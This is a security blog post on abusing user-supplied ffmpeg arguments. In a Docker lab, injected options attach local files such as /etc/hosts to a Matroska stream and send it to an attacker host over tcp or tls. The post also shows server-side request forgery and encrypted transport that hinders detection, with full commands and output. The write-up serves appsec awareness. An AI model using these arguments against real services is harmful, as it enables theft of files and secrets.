Title: Exfiltration via ffmpeg

URL Source: https://beny23.github.io/posts/ffmpeg_exfil/

Published Time: 2025-11-23T00:00:00+00:00

Markdown Content:
Here’s a fun thought experiment. What if you have an application that allows user-supplied parameters for [ffmpeg](https://www.ffmpeg.org/). Is this a problem? Could this be a security risk?

Let’s get one thing out of the way, I’m not talking about command injection, where it would be possible to inject shell commands.

Let’s assume that the implementation is something like the following:

```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
``````
import { spawn } from 'child_process';

const FFMPEG_LOG_LEVEL = 'verbose';
const argsOpt = userSuppliedArgs.split(' ');
const args = [
  '-f',
  's16le',
  '-y',
  '-nostdin',
  '-loglevel',
  FFMPEG_LOG_LEVEL,
  '-probesize',
  '32',
  '-i',
  '-',
  // FFMPEG_COMPRESSOR_ARG is inserted here
  '-f',
  's16le',
  '-',
];
if (argsOpt) args.splice(10, 0, ...argsOpt);
spawn('ffmpeg', args, {
  detached: true,
});
```

Let’s say that ffmpeg is called to clean up some audio or do echo calculation as part of a service.

The first thing to say is that calling spawn this way is not vulnerable to command injection. Putting

```
; touch /tmp/l33t_h4x0rs_were_here
```

Into the user supplied input won’t work as it will just be passed as an argument to the ffmpeg call.

One possibility I thought of… ffmpeg does process URLs. So by specifying a second `-i` option it is feasible to get additional video or audio sources ingested:

```
# cat testing.m4a | ffmpeg -f s16le -y -nostdin -loglevel error \ 
     -probesize 32 -i - -report -i https://httpbin.io/dump/request -f s16le - > out
mpp[100]: mpp_soc: open /proc/device-tree/compatible error
mpp[100]: mpp_platform: can not found match soc name: 
mpp[100]: mpp_rt: can NOT found any allocator
[in#1 @ 0xc33bfea38190] Error opening input: Invalid data found when processing input
Error opening input file https://httpbin.io/dump/request.
Error opening input files: Invalid data found when processing input
```

So, by adding `-report -i URL` I was able to get a network request. Now according to the docs it is also possible to specify multiple outputs and use network URL to push outputs out, so this could be used to exfiltrate audio files (assuming we’ve not got any egress protection).

But audio files are a bit… well, not so interesting.

Matroska
--------

One thing that did peak my attention was this snippet in the docs:

> -attach filename (output)
> 
> 
> Add an attachment to the output file. This is supported by a few formats like Matroska for e.g. fonts used in rendering subtitles. Attachments are implemented as a specific type of stream, so this option will add a new stream to the file

And this turned out to be rather interesting!

Demo
----

Let’s demonstrate using docker. First I created a docker network:

```
% docker network create test-network  
66daf2394bd91f863e62e547fdb6371f7d2570f962a9cc2304493491dccc49bd
```

Then I started two docker containers: victim and attacker. Assuming the victim represents the container that will have ffmpeg parameters injected and the attacker is a computer in the attackers control.

Attacker Setup
--------------

```
% docker run --rm --network test-network --name attacker \
     -it --entrypoint /bin/bash linuxserver/ffmpeg:version-8.0-cli               
root@b8e1b0b0f711:/# ffmpeg -dump_attachment:t "out.txt" -i "tcp://attacker:8008?listen"
```

Here I pull a docker container with the ffmpeg program on it from dockerhub. Though it doesn’t have to be that particular image, any ffmpeg installation should do.

Victim Setup
------------

```
% docker run --rm --network test-network --name victim \
     -it --entrypoint /bin/bash linuxserver/ffmpeg:version-8.0-cli
```

Then when I simulate running the injection, I’ll add the following:

```
-c copy -attach /etc/hosts -metadata:s:t:0 mimetype=text/plain \ 
   -f matroska tcp://attacker:8008
```

This will use the Matroska format and embed an additional stream, package it all up and send it to the attacker.

The full test command line on the victim machine is:

```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
``````
root@9c0d961d5d15:/# cat testing.m4a| ffmpeg -f s16le -y \
  -nostdin -loglevel info -probesize 32 -i - -c copy \ 
  -attach /etc/hosts -metadata:s:t:0 mimetype=text/plain \
  -f matroska tcp://attacker:8008 -f s16le - > out
[..]
Input #0, s16le, from 'fd:':
  Duration: N/A, bitrate: 705 kb/s
  Stream #0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s
Stream mapping:
  Stream #0:0 -> #0:0 (copy)
  File /etc/hosts -> Stream #0:1
  Stream #0:0 -> #1:0 (pcm_s16le (native) -> pcm_s16le (native))
Output #0, matroska, to 'tcp://attacker:8008':
  Metadata:
    encoder         : Lavf62.3.100
  Stream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 44100 Hz, mono, s16, 705 kb/s
  Stream #0:1: Attachment: none
    Metadata:
      filename        : hosts
      mimetype        : text/plain
Output #1, s16le, to 'pipe:':
  Metadata:
    encoder         : Lavf62.3.100
  Stream #1:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s
    Metadata:
      encoder         : Lavc62.11.100 pcm_s16le
[out#0/matroska @ 0xc2ad21eb23e0] video:0KiB audio:24KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 2.764749%
[out#1/s16le @ 0xc2ad21eb38d0] video:0KiB audio:24KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.000000%
size=      24KiB time=00:00:00.27 bitrate= 725.1kbits/s speed= 157x elapsed=0:00:00.00
```

To reiterate, if that’s a service that allows someone to inject arbitrary ffmpeg parameters, this is quite feasible.

Now, on the attacker machine:

```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
``````
root@b8e1b0b0f711:/# ffmpeg -dump_attachment:t "out.txt" \ 
    -i "tcp://attacker:8008?listen"
[..]    
[matroska,webm @ 0xc3e69e51f100] Could not find codec parameters for stream 1 (Attachment: none): unknown codec
Input #0, matroska,webm, from 'tcp://attacker:8008?listen':
  Metadata:
    ENCODER         : Lavf62.3.100
  Duration: N/A, start: 0.000000, bitrate: 705 kb/s
  Stream #0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s
  Stream #0:1: Attachment: none
    Metadata:
      filename        : hosts
      mimetype        : text/plain
[aist#0:1/none @ 0xc3e69e527d20] Wrote attachment (174 bytes) to 'out.txt'
At least one output file must be specified
```

And then the output file was

```
1
2
3
4
5
6
7
8
``````
root@b8e1b0b0f711:/# cat out.txt 
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.23.0.2	9c0d961d5d15
```

Now obviously the /etc/hosts file is not that interesting, but other local files are definitely something that could contain all kinds of secrets.

Server Side Request Forgery
---------------------------

It’s not enough to be able to exfiltrate files from the victim system, it is also possible to have ffmpeg make REST calls. As demonstrated here:

```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
``````
root@9c0d961d5d15:/# cat testing.m4a| ffmpeg -f s16le -y \
  -nostdin -loglevel info -probesize 32 -i - -c copy \
  -attach https://httpbin.io/dump/request \ 
  -metadata:s:t:0 mimetype=text/plain \
  -f matroska tls://attacker:8008 -f s16le - > out
[..]
Input #0, s16le, from 'fd:':
  Duration: N/A, bitrate: 705 kb/s
  Stream #0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s
Stream mapping:
  Stream #0:0 -> #0:0 (copy)
  File https://httpbin.io/dump/request -> Stream #0:1
  Stream #0:0 -> #1:0 (pcm_s16le (native) -> pcm_s16le (native))
Output #0, matroska, to 'tls://attacker:8008':
  Metadata:
    encoder         : Lavf62.3.100
  Stream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 44100 Hz, mono, s16, 705 kb/s
  Stream #0:1: Attachment: none
    Metadata:
      filename        : request
      mimetype        : text/plain
Output #1, s16le, to 'pipe:':
  Metadata:
    encoder         : Lavf62.3.100
  Stream #1:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s
    Metadata:
      encoder         : Lavc62.11.100 pcm_s16le
[out#0/matroska @ 0xbd9cf0c1a3c0] video:0KiB audio:24KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 2.637209%
[out#1/s16le @ 0xbd9cf0d87b00] video:0KiB audio:24KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.000000%
size=      24KiB time=00:00:00.27 bitrate= 724.2kbits/s speed= 136x elapsed=0:00:00.00
```

and on the attacker side

```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
``````
root@b8e1b0b0f711:/# ffmpeg -dump_attachment:t "out.txt" \
  -i "tls://attacker:8008?listen"
[..]  
[matroska,webm @ 0xb19a96998100] Could not find codec parameters for stream 1 (Attachment: none): unknown codec
Consider increasing the value for the 'analyzeduration' (0) and 'probesize' (5000000) options
[aist#0:0/pcm_s16le @ 0xb19a96aeaef0] Guessed Channel Layout: mono
Input #0, matroska,webm, from 'tls://attacker:8008?listen':
  Metadata:
    ENCODER         : Lavf62.3.100
  Duration: N/A, start: 0.000000, bitrate: 705 kb/s
  Stream #0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s
  Stream #0:1: Attachment: none
    Metadata:
      filename        : request
      mimetype        : text/plain
File 'out.txt' already exists. Overwrite? [y/N] y
[aist#0:1/none @ 0xb19a96aeb080] Wrote attachment (141 bytes) to 'out.txt'
At least one output file must be specified
```

and then in the file:

```
1
2
3
4
5
6
7
8
``````
root@b8e1b0b0f711:/# cat out.txt 
GET /dump/request HTTP/1.1
Host: httpbin.io
Accept: */*
Connection: close
Icy-Metadata: 1
Range: bytes=0-
User-Agent: Lavf/62.3.100
```

I can see that the [https://httpbin.io/dump/request](https://httpbin.io/dump/request) endpoint has given me the HTTP request headers sent by ffmpeg.

Masking exfiltration
--------------------

Oh, and this time I used the `tls` protocol instead of `tcp` - which means the payloads that I’m exfiltrating are encrypted in transport, which should make detection more difficult.

Conclusion
----------

That was a fun theoretical exercise and demonstrated that the swiss army knife that’s called ffmpeg can be used for all kinds of fun things.

To protect yourself, you’ve got egress protection, right? Right?

**Tags**[appsec](https://beny23.github.io/tags/appsec/)[security](https://beny23.github.io/tags/security/)

If you'd like to find more of my writing, why not follow me on [Bluesky](https://bsky.app/profile/beny23.github.io "BlueSky link") or [Mastodon](https://infosec.exchange/@beny23 "Mastodon link")?